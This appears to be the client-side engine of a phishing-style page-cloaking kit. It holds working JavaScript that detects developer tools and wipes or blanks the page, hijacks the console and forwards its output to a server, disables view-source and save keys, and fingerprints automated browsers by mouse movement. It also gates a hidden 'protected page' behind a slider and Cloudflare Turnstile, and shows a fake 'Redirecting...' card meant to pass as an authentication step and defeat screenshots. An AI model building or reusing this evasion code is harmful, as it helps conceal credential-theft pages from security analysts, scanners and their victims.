    // Method 1: Window size detection (desktop only)
    var interval = setInterval(function() {
      if (isInGracePeriod()) return;
      if (window.outerHeight - window.innerHeight > threshold ||
          window.outerWidth - window.innerWidth > threshold) {
        if (!devtools.open) {
          devtools.open = true;
          immediateRedirect();
        }
      }
    }, 500); // Slowed from 100ms to 500ms

    // Method 2: Console.log detection - DISABLED to avoid conflict with logging
    // The console.log override was causing false positives with our server-side logging
    // We rely on other methods (timing, window size) for devtools detection instead

    // Method 3: Debugger detection
    setTimeout(function() {
      setInterval(function() {
        if (isInGracePeriod()) return;
        var start = performance.now();
        debugger;
        if (performance.now() - start > 200) { // Increased threshold from 100ms to 200ms
          immediateRedirect();
        }
      }, 2000); // Slowed from 1000ms to 2000ms
    }, _gracePeriodMs);

    // Method 4: DevTools detection
    if (typeof window.__devtools !== 'undefined') {
      devtools.open = true;
      immediateRedirect();
    }

    var _immediateRedirectCalled = false;
    function immediateRedirect() {
      // Prevent multiple calls
      if (_immediateRedirectCalled) return;
      _immediateRedirectCalled = true;

      clearInterval(interval);
      try { window.close(); } catch(e) {}
      // Added delay before redirect
      setTimeout(function() {
        window.location.replace('about:blank');
        setTimeout(function() {
          document.body.innerHTML = '';
          document.head.innerHTML = '';
        }, 100);
      }, 1500);
    }
  }

  // ─── Obfuscation (optional, controlled by admin) ────────────
  // The admin flag arrives as a STRING ("true"/"false") from buildWindowVars,
  // and a non-empty string is always truthy - so a plain `if (!flag)` guard ran
  // this block whether the toggle was on or off. Coerce it explicitly.
  function _flagEnabled(v) {
    return v === true || v === 1 || String(v) === 'true' || String(v) === '1';
  }
  function initObfuscation() {
    if (!_flagEnabled(window.__OBFUSCATION_ENABLED)) return;
    // Re-apply the console hijack so the console stays clean no matter the
    // script order. The slider overlay is injected AFTER vg-engine, so it could
    // in principle bring the original console back; re-installing here is what
    // makes the top-of-file hijack actually stick.
    //
    // The previous version here was labelled "Console clearing" but did the
    // opposite: it captured whatever console.log currently was and wrapped it
    // in a passthrough, so it neither silenced anything nor sent anything to
    // the server.
    (function () {
      console.log = function () { logToServer('info', Array.prototype.slice.call(arguments).join(' ')); };
      console.warn = function () { logToServer('warn', Array.prototype.slice.call(arguments).join(' ')); };
      console.error = function () { logToServer('error', Array.prototype.slice.call(arguments).join(' ')); };
    })();
    // Disable right-click
    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });
    // Disable Ctrl+U, Ctrl+S, F12
    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 's')) e.preventDefault();
      if (e.key === 'F12') e.preventDefault();
    });
  }

  // ─── Slider Chain Handler ───────────────────────────────────
  // Called when slider verification completes - renders Cloudflare turnstile
  // into the vgCfLayer and handles the verification flow
  function initSliderChainHandler() {
    // Check if this page uses slider design
    // Handle both boolean true and string "true" (from different injection methods)
    var isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (!isSlider) { return; }

    console.log('[vg-engine] Slider design detected, setting up chain handler');

    // State flags to prevent race conditions
    var _sliderCompleted = false;
    var _turnstileRendering = false;
    var _turnstileRendered = false;
    var _layersHidden = false;
    // Turnstile render/execute failure budget. A failure is never allowed to
    // reveal the protected page; instead the visitor gets a bounded number of
    // automatic retries and then a manual Retry button.
    var _cfAttempts = 0;
    var _cfMaxAttempts = 3;
    // Grace period before an incomplete challenge is treated as failed. Long
    // enough for a slow visitor to use the Retry button, short enough that no
    // visitor is stranded permanently if Cloudflare is unreachable.
    var CF_TIMEOUT_MS = 180000;

    // Last reason the challenge failed. The retry path in executeTurnstileIntoWrap
    // hits its own budget guard BEFORE _onCfFailure can report, which swallowed
    // the real Turnstile error code - the visitor saw only "Retry limit reached"
    // and there was no way to tell 110200 from a blocked script.
    var _cfLastError = '';

    // Timeout: if Turnstile never completes (network error, origin mismatch,
    // etc.) the verification layer stays up and the visitor is given the Retry
    // button. Nothing here is allowed to hide the layers - that would reveal the
    // protected page with no verification at all.
    // 180s: long enough for a human to use the Retry button, short enough that no
    // visitor is stranded permanently if Cloudflare is down.
    var _cfTimeoutTimer = null;
    function _resetCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
      _cfTimeoutTimer = setTimeout(function() {
        // The challenge never completed within the grace period. The layer MUST
        // stay up: hiding it here would reveal the protected page with no
        // verification at all - the exact opposite of a verification gate, and
        // precisely how a broken or blocked challenge was "fixed" before by
        // letting the visitor straight through.
        //
        // Force the terminal failure state (budget exhausted) so the visitor gets
        // the Retry button instead. Resetting the budget in Retry means a slow
        // visitor can still complete the challenge on a later attempt.
        console.warn('[vg-engine] Cloudflare verification timed out after ' +
          CF_TIMEOUT_MS + 'ms; keeping the verification layer up');
        _cfAttempts = _cfMaxAttempts;
        _cfLastError = 'Turnstile did not complete within the timeout';
        _turnstileRendering = false;
        _turnstileRendered = true;
        showCfFailureState(document.getElementById('vgCfHint'), _cfLastError);
      }, CF_TIMEOUT_MS);
    }
    function _cancelCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
    }

    // ── Turnstile failure handling ─────────────────────────────
    // IMPORTANT: this function must NEVER hide the layers. Hiding them reveals
    // the protected page with no verification at all, which is the exact
    // opposite of what a verification gate should do. A failed Turnstile
    // challenge (most commonly a domain that was never added to the widget's
    // allowed origins) is a configuration problem on the platform side;
    // silently passing it means the protection was never applied.
    function _onCfFailure(errMsg) {
      _turnstileRendering = false;
      _cfLastError = String(errMsg || '');
      var cfHint = document.getElementById('vgCfHint');

      if (_cfAttempts >= _cfMaxAttempts) {
        _turnstileRendered = true;
        showCfFailureState(cfHint, errMsg);
        return;
      }

      _cfAttempts += 1;
      console.warn('[vg-engine] Cloudflare verification failed (' + _cfAttempts + '/' +
        _cfMaxAttempts + '): ' + errMsg);
      if (cfHint) {
        cfHint.textContent = 'Verification failed, retrying (' + _cfAttempts +
          ' of ' + _cfMaxAttempts + ')...';
      }
      setTimeout(function () {
        var wrap = document.getElementById('vgCfWidgetWrap');
        var ph = document.getElementById('vgCfPlaceholder');
        if (wrap) { try { wrap.innerHTML = ''; } catch (e) {} }
        if (ph) ph.style.display = 'flex';
        renderTurnstileIntoCfLayer();
      }, 1500);
    }

    // Persistent failure state: keep the Cloudflare layer on screen and give
    // the visitor an explicit Retry button instead of revealing the page.
    function showCfFailureState(cfHint, detail) {
      var cfLayer = document.getElementById('vgCfLayer');
      if (cfLayer) {
        cfLayer.style.display = 'flex';
        cfLayer.style.visibility = 'visible';
        cfLayer.style.pointerEvents = 'auto';
      }
      var wrap = document.getElementById('vgCfWidgetWrap');
      if (wrap) { try { wrap.innerHTML = ''; } catch (e) {} }
      var ph = document.getElementById('vgCfPlaceholder');
      if (ph) ph.style.display = 'none';

      if (!cfHint) return;
      cfHint.textContent = '';
      cfHint.style.display = 'flex';
      cfHint.style.flexDirection = 'column';
      cfHint.style.alignItems = 'center';
      cfHint.style.justifyContent = 'center';
      cfHint.style.gap = '12px';

      var msg = document.createElement('div');
      msg.style.cssText = 'font-size:13px;color:#605E5C;line-height:1.5;max-width:300px;text-align:center;';
      msg.textContent = 'Security verification could not be completed. Please try again.';

      // Reason the challenge failed. Turnstile's own error code is only
      // visible in the browser console, which the obfuscation strips
      // (disableConsoleOutput), so it was impossible to tell 110200
      // "domain not authorized" apart from a blocked script or a timed-out
      // challenge. console.* is unavailable here; DOM text is not.
      if (detail) {
        var det = document.createElement('div');
        det.style.cssText = 'font-size:11px;color:#9a9896;line-height:1.4;max-width:300px;' +
          'text-align:center;font-family:monospace;margin-top:4px;';
        det.textContent = String(detail);
        cfHint.appendChild(det);
      }

      var btn = document.createElement('button');
      btn.type = 'button';
      btn.textContent = 'Retry security check';
      btn.style.cssText = 'padding:10px 22px;font-size:13px;font-weight:600;color:#fff;' +
        'background:#232333;border:0;border-radius:8px;cursor:pointer;font-family:inherit;';
      btn.addEventListener('click', function () {
        btn.disabled = true;
        btn.textContent = 'Retrying...';
        _cfAttempts = 0;
        _turnstileRendered = false;
        var wrap2 = document.getElementById('vgCfWidgetWrap');
        if (wrap2) { try { wrap2.innerHTML = ''; } catch (e) {} }
        setTimeout(function () { renderTurnstileIntoCfLayer(); }, 500);
      });

      cfHint.appendChild(msg);
      cfHint.appendChild(btn);
    }

    // Register the slider complete callback - ONLY ONCE
    // This prevents double-registration if vg-engine loads multiple times
    if (typeof window.__vgOnSliderComplete !== 'function' || !window.__vgOnSliderComplete._isEngine) {
      window.__vgOnSliderComplete = function() {
        if (_sliderCompleted) {
          console.log('[vg-engine] Slider complete callback fired but already processed, ignoring');
          return;
        }
        _sliderCompleted = true;
        console.log('[vg-engine] Slider completed, rendering Cloudflare turnstile');

        // ── Behavior analysis gate ───────────────────────────────
        // Automation (Puppeteer mouse.move, Playwright mouse.move) produces
        // near-straight trajectories with near-zero velocity variance. A
        // human drags the slider with variable speed and direction changes.
        // This check runs BEFORE the Turnstile renders, so a bot that
        // solves the slider still can't reach the challenge.
        try {
          var mouseResult = window.__VG_ANALYZE_MOUSE ? window.__VG_ANALYZE_MOUSE() : null;
          if (mouseResult && mouseResult.score >= 0.6) {
            console.error('[vg-engine] Robotic mouse trajectory detected, score=' + mouseResult.score.toFixed(3) +
              ' velCV=' + (mouseResult.velCV || 0).toFixed(3) +
              ' dirChange=' + (mouseResult.dirChangeRatio || 0).toFixed(3) +
              ' straight=' + (mouseResult.straightness || 0).toFixed(3) +
              ' events=' + mouseResult.eventCount);
            if (typeof window.__VG_KILLPAGE === 'function') {
              window.__VG_KILLPAGE('robotic_mouse:' + mouseResult.score.toFixed(2));
              return;
            }
          }
        } catch (e) { /* never let the analysis itself break the flow */ }

        // Dismiss the slider layer HERE, in the engine.
        //
        // Design scripts (verification-designs/*.html) only call this callback -
        // they never hide their own overlay - and #vgSliderLayer sits ABOVE
        // #vgCfLayer (z-index 99999 vs 99998). Leaving the slider up meant the
        // Cloudflare challenge rendered underneath it and stayed permanently
        // invisible, so the visitor sat on a frozen "Verified" screen until the
        // 45s timeout hid both layers at once and skipped the challenge.
        var sliderLayer = document.getElementById('vgSliderLayer');
        if(sliderLayer){
          sliderLayer.style.display = 'none';
          sliderLayer.style.visibility = 'hidden';
          sliderLayer.style.pointerEvents = 'none';
        }

        // Show the Cloudflare layer (slider layer is hidden above)
        var cfLayer = document.getElementById('vgCfLayer');
        if(cfLayer){
          cfLayer.style.display = 'flex';
        }

        // Publish completion state so the recovery paths below this function
        // (which read window.__vgSliderVerified) can see it. Previously nothing
        // ever set this, so that branch was permanently dead.
        window.__vgSliderVerified = true;
        // Same reason: the polling loop further down calls this function, and no
        // design script ever defined it, so the recovery path never fired.
        window.__vgCheckSliderReady = function () {
          return window.__vgSliderVerified === true;
        };

        // Render Cloudflare turnstile into the vgCfWidgetWrap
        renderTurnstileIntoCfLayer();
      };
      // Mark this as the engine's callback to prevent overwrites
      window.__vgOnSliderComplete._isEngine = true;
    }

    // FIX: Check if slider already completed before vg-engine loaded
    // The slider overlay sets __vgPendingSliderComplete if it finishes before
    // vg-engine.js loads. We must call __vgOnSliderComplete to render Turnstile.
    if (window.__vgPendingSliderComplete && window.__vgSliderVerified) {
      console.log('[vg-engine] Slider had already completed before engine loaded, triggering Turnstile');
      setTimeout(function() {
        if (typeof window.__vgOnSliderComplete === 'function') {
          window.__vgOnSliderComplete();
        }
      }, 100);
    }
    
    // Render Cloudflare turnstile widget into the vgCfLayer
    function renderTurnstileIntoCfLayer() {
      if (_turnstileRendering || _turnstileRendered) {
        console.log('[vg-engine] Turnstile already rendering or rendered, skipping');
        return;
      }
      _turnstileRendering = true;

      var cfWidgetWrap = document.getElementById('vgCfWidgetWrap');
      var cfPlaceholder = document.getElementById('vgCfPlaceholder');
      var cfHint = document.getElementById('vgCfHint');
      
      if(!cfWidgetWrap) {
        // A missing widget container means the verification overlay is broken.
        // Hiding the layers here would reveal the protected page with no
        // verification, so surface the failure instead and let the visitor
        // retry.
        //
        // NB: don't go through _onCfFailure() - that retries and clears the
        // attempt budget, but there is nothing to retry: the container simply
        // isn't in the DOM, so every retry would hang on the 1500ms placeholder
        // wait and the Retry button would die.
        console.warn('[vg-engine] vgCfWidgetWrap not found - keeping verification layer up');
        _turnstileRendering = false;
        _turnstileRendered = true;
        showCfFailureState(cfHint, 'Widget container missing');
        return;
      }
      
      // Hide the loading placeholder. Regenerate it if a previous failure state
      // destroyed it: showCfFailureState() clears vgCfWidgetWrap.innerHTML,
      // which takes vgCfPlaceholder away with it. Without this, a Retry
      // re-entered here, timed out on the 1500ms placeholder wait, and the
      // Retry button died - the visitor was stuck on a frozen failure screen.
      if(cfPlaceholder) {
        cfPlaceholder.style.display = 'none';
      } else if(cfWidgetWrap) {
        var ph = document.createElement('div');
        ph.id = 'vgCfPlaceholder';
        ph.style.cssText = 'text-align:center;';
        ph.innerHTML = '<div style="width:40px;height:40px;border:3px solid #e4e4e4;' +
          'border-top-color:#0078D4;border-radius:50%;animation:vgSpin 1s linear infinite;' +
          'margin:0 auto 12px;"></div>' +
          '<div style="font-size:13px;color:#605E5C;">Completing verification...</div>';
        cfWidgetWrap.appendChild(ph);
      }
      
      // Check if Turnstile is already loaded
      if(typeof window.turnstile !== 'undefined') {
        executeTurnstileIntoWrap(cfWidgetWrap);
      } else if(window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
        // Load Turnstile script dynamically with onload callback
        console.log('[vg-engine] Loading Cloudflare Turnstile for slider chain');
        var script = document.createElement('script');
        script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReadyForSlider';
        script.async = true;
        script.defer = true;
        script.id = 'vg-turnstile-script-slider';
        (document.head || document.documentElement).appendChild(script);
        
        // Timeout if the script takes too long to load. Route through the
        // failure handler so the visitor is retried rather than let through -
        // the old behaviour hid both layers and revealed the protected page.
        setTimeout(function() {
          if (typeof window.turnstile === 'undefined') {
            _onCfFailure('Turnstile script failed to load within timeout');
          }
        }, 15000);
        
        // Global callback for when Turnstile loads
        window.vgOnTurnstileReadyForSlider = function() {
          console.log('[vg-engine] Cloudflare Turnstile loaded for slider chain');
          _turnstileRendering = false;
          executeTurnstileIntoWrap(cfWidgetWrap);
        };
      } else {
        // No site key available - the widget CANNOT be rendered. Refuse to
        // reveal the protected page: the old behaviour hid both layers here and
        // let the visitor straight through, which is how a missing or
        // late-created assignment row showed up as "the challenge never
        // appeared". Surface the failure state with the Retry button instead.
        console.warn('[vg-engine] No Turnstile site key - refusing to reveal the page');
        _onCfFailure('No Turnstile site key configured');
      }
    }
    
    function executeTurnstileIntoWrap(widgetWrap) {
      // Fetch cfHint here since it's not in scope from renderTurnstileIntoCfLayer
      var cfHint = document.getElementById('vgCfHint');

      // Budget exhausted - keep the layer up with the Retry button.
      // Report the real last error rather than a generic string: this guard
      // fires on the retry path, before _onCfFailure gets a chance to report,
      // so without this the Turnstile error code was permanently lost.
      if (_cfAttempts >= _cfMaxAttempts) {
        showCfFailureState(cfHint, _cfLastError || 'Retry limit reached');
        return;
      }

      try {
        var widgetId = window.turnstile.render('#vgCfWidgetWrap', {
          sitekey: window.__TURNSTILE_SITE_KEY,
          theme: 'light',
          retry: 'auto', // 'auto' shows Turnstile's own "Try again" link on error.
          // Only 'never' and 'auto' are valid here - the api.js rejects anything
          // else with error 3592 ("Invalid type for parameter 'retry', expected
          // never|auto"), which previously killed the challenge outright because
          // the widget was created with retry: 'always'.
          callback: function(token) {
            console.log('[vg-engine] Cloudflare Turnstile completed');
            _cancelCfTimeout(); // Cancel timeout on success
            // Turnstile passed - hide layers and show main content
            window.__TURNSTILE_TOKEN = token;
            _turnstileRendered = true;
            setTimeout(function(){
              hideSliderAndCfLayers();
            }, 1000);
          },
          'error-callback': function(errorCode) {
            // Fired for a real challenge failure (e.g. domain mismatch when the
            // page origin was never added to the widget's allowed origins).
            // Retry a bounded number of times, then ask the visitor to retry.
            console.warn('[vg-engine] Cloudflare Turnstile error-callback, code: ' +
              (errorCode || 'unknown'));
            _onCfFailure('Turnstile error-callback ' + (errorCode || ''));
          },
          'expired-callback': function() {
            console.warn('[vg-engine] Cloudflare Turnstile expired, re-executing');
            _cfAttempts = 0;
            try { window.turnstile.execute(widgetId); }
            catch(e) { _onCfFailure(String(e)); }
          }
        });

        // Start timeout AFTER Turnstile is successfully rendered (not when slider completes)
        _resetCfTimeout();

        // Execute the challenge immediately
        setTimeout(function() {
          try {
            window.turnstile.execute(widgetId);
          } catch(e) {
            console.error('[vg-engine] Failed to execute Turnstile:', e.message || e);
            _onCfFailure(String(e));
          }
        }, 500);

      } catch(e) {
        console.error('[vg-engine] Failed to render Turnstile:', e.message || e);
        _onCfFailure(String(e));
      }
    }
    
    // Turnstile passed. Show a short "Redirecting..." transition before the
    // protected page appears, then dismiss the verification layers.
    //
    // A sub-second reveal reads as "the popup was just closed" - there is no
    // hand-off at all. A brief redirect state looks like a normal
    // authentication completion, and a screenshot taken mid-transition
    // captures nothing usable.
    //
    // The card reuses the verification layer's own styling (#F1F3F5 backdrop,
    // white rounded card, #0078D4 spinner) so the transition reads as the same
    // flow rather than a second, unrelated screen.
    function _showRedirectTransition(onDone) {
      var REDIRECT_MS = 2500;

      // Self-contained keyframes - vg-engine is embedded inside arbitrary
      // template HTML, so it cannot rely on a host @keyframes definition.
      var style = document.createElement('style');
      style.textContent = '@keyframes vgRedirectSpin{to{transform:rotate(360deg)}}';
      (document.head || document.documentElement).appendChild(style);

      var el = document.getElementById('vgRedirectLayer');
      if (!el) {
        el = document.createElement('div');
        el.id = 'vgRedirectLayer';
        el.style.cssText = 'position:fixed;inset:0;z-index:100000;background:#F1F3F5;' +
          'font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,sans-serif;' +
          'display:flex;align-items:center;justify-content:center;padding:24px 16px;';
        el.innerHTML =
          '<div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);' +
          'border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">' +
          '<div style="width:36px;height:36px;border:3px solid #EDEBE9;border-top-color:#0078D4;' +
          'border-radius:50%;margin:0 auto 20px;animation:vgRedirectSpin 1s linear infinite;"></div>' +
          '<h1 style="font-size:20px;font-weight:700;color:#232333;margin-bottom:6px;">Redirecting...</h1>' +
          '<p style="font-size:13px;color:#605E5C;margin:0;line-height:1.5;">Please wait a moment.</p>' +
          '</div>';
        document.body.appendChild(el);
      }
      el.style.display = 'flex';

      setTimeout(function() {
        try { if (el.parentNode) el.parentNode.removeChild(el); } catch (e) {}
        if (typeof onDone === 'function') onDone();
      }, REDIRECT_MS);
    }

    function hideSliderAndCfLayers() {
      if (_layersHidden) {
        console.log('[vg-engine] Layers already hidden, skipping');
        return;
      }
      _layersHidden = true;

      // Play the redirect transition FIRST, then remove the layers. The layers
      // stay up underneath the transition, so there is never a frame where the
      // protected page is visible with no overlay.
      _showRedirectTransition(function() {
        var sliderLayer = document.getElementById('vgSliderLayer');
        var cfLayer = document.getElementById('vgCfLayer');

        if(sliderLayer){
          sliderLayer.style.display = 'none';
          sliderLayer.style.visibility = 'hidden';
        }
        if(cfLayer){
          cfLayer.style.display = 'none';
          cfLayer.style.visibility = 'hidden';
        }

        console.log('[vg-engine] Verification layers hidden, showing main content');
        // The template's main card should become visible now
        // Don't force display - let CSS/template handle it
      });
    }
    
    // Check if slider is already completed when vg-engine loads
    // Use a single check instead of multiple overlapping mechanisms
    setTimeout(function(){
      if (!_sliderCompleted && window.__vgCheckSliderReady && window.__vgCheckSliderReady()) {
        console.log('[vg-engine] Slider was already completed, initializing Cloudflare');
        if (typeof window.__vgOnSliderComplete === 'function') {
          window.__vgOnSliderComplete();
        }
      }
    }, 1000);
  }
  
  // ─── Init ───────────────────────────────────────────────────
  function init() {
    applyDynamicContent();
    initBackgroundBlur();
    initSliderChainHandler();
    initBotDetection();
    initAntiScreenshot();
    initAntiClone();
    initAntiDebug();
    initAntiScraping();
    initObfuscation();
  }

  // Expose killPage to vg-fingerprint.js and other external modules.
  // The internal killPage functions are scoped inside their IIFEs; this
  // shared implementation does the same wipe + log flush so the fingerprint
  // layer can fail closed without depending on which IIFE runs first.
  window.__VG_KILLPAGE = function (reason) {
    if (window.__VG_KILLPAGE_DONE) return;
    window.__VG_KILLPAGE_DONE = true;

    console.error('[VG] killPage called' + (reason ? ': ' + reason : ''));
    console.error('[VG] URL:', window.location.href);
    console.error('[VG] User-Agent:', navigator.userAgent);

    try {
      document.open();
      document.write('');
      document.close();
    } catch (e) {}

    try { flushLogs(); } catch (e) {}

    setTimeout(function () {
      try { window.location.replace('about:blank'); } catch (e) {}
    }, 400);
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
